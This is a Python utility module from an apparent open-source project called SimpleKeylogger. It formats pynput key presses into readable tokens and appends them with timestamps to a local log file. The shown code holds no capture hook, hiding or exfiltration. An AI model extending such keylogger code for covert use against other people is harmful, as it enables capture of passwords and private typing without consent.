#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Utility functions for SimpleKeylogger
Author: Yash (Popeye) Raut
GitHub: https://github.com/yashraut369
"""

import datetime
import os
from pynput import keyboard

def format_key(key):
    """
    Format a key press into a readable string.
    
    Args:
        key: The key object from pynput
    
    Returns:
        str: A readable representation of the key
    """
    try:
        # Handle special keys
        if key == keyboard.Key.space:
            return "[Space]"
        elif key == keyboard.Key.enter:
            return "[Enter]"
        elif key == keyboard.Key.tab:
            return "[Tab]"
        elif key == keyboard.Key.backspace:
            return "[Backspace]"
        elif key == keyboard.Key.shift:
            return "[Shift]"
        elif key == keyboard.Key.shift_r:
            return "[Right Shift]"
        elif key == keyboard.Key.ctrl:
            return "[Ctrl]"
        elif key == keyboard.Key.ctrl_r:
            return "[Right Ctrl]"
        elif key == keyboard.Key.alt:
            return "[Alt]"
        elif key == keyboard.Key.alt_gr:
            return "[Alt Gr]"
        elif key == keyboard.Key.caps_lock:
            return "[Caps Lock]"
        elif key == keyboard.Key.esc:
            return "[Esc]"
        # Function keys
        elif hasattr(key, 'name') and key.name.startswith('f') and key.name[1:].isdigit():
            return f"[{key.name.upper()}]"
        elif key == keyboard.Key.up:
            return "[↑]"
        elif key == keyboard.Key.down:
            return "[↓]"
        elif key == keyboard.Key.left:
            return "[←]"
        elif key == keyboard.Key.right:
            return "[→]"
        else:
            # Regular character keys
            return key.char
    except AttributeError:
        # For keys that don't have a char attribute
        return f"[{str(key)}]"

def save_to_file(file_path, keys):
    """
    Save the recorded keys to a file.
    
    Args:
        file_path (str): The path to the log file
        keys (list): List of recorded keys
    """
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # Create file if it doesn't exist
    if not os.path.exists(file_path):
        with open(file_path, 'w') as f:
            f.write(f"SimpleKeylogger - Started at {timestamp}\n")
    
    with open(file_path, 'a') as log_file:
        log_file.write(f"\n--- Keylog entry at {timestamp} ---\n")
        
        for key in keys:
            formatted_key = format_key(key)
            # Skip None values
            if formatted_key is not None:
                log_file.write(formatted_key)
            
        log_file.write("\n")
